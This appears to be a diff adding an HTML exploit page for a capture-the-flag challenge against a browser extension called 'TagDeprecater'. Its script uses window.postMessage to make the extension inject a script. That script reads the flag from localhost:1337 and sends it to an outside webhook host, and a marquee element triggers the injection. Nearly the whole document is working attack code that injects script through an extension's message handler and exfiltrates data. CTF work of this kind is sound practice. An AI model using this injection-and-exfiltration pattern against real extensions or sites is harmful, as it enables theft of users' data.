@@ -1,3 +1,41 @@
+<!DOCTYPE html>
 <html>
-  hi
+<head>
+    <title>TagDeprecater Exploit</title>
+</head>
+<body>
+    <h1>TagDeprecater Exploit</h1>
+    <p>This page will exploit the TagDeprecater extension to steal the flag.</p>
+    
+    <script>
+        // Wait for the extension to load
+        setTimeout(() => {
+            // Set the replacement string to JavaScript that steals the flag
+            const maliciousReplacement = `<script>
+                // Fetch the flag from localhost:1337 and send it to our webhook
+                fetch('http://localhost:1337')
+                    .then(response => response.text())
+                    .then(flagData => {
+                        // Send flag to our webhook
+                        fetch('https://rnug6unj.ssrf.cvssadvisor.com?flag=' + encodeURIComponent(flagData));
+                    })
+                    .catch(e => console.log('Error:', e));
+            </script>`;
+            
+            // Send message to extension to set the replacement string
+            window.postMessage({
+                type: 'SET',
+                replacementString: maliciousReplacement
+            }, '*');
+            
+            // Create a marquee tag to trigger the extension
+            setTimeout(() => {
+                const marquee = document.createElement('marquee');
+                marquee.textContent = 'Trigger extension';
+                document.body.appendChild(marquee);
+            }, 1000);
+            
+        }, 2000);
+    </script>
+</body>
 </html>
